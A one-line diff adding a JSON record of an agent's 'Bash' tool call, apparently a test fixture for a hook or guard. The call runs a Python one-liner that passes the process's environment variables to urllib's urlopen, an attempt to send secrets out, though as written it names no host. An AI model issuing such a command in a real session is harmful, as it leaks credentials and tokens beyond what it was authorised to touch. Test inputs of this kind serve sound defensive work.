@@ -1,0 +1,1 @@
+{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import urllib.request,os; urllib.request.urlopen(os.environ)\""}}
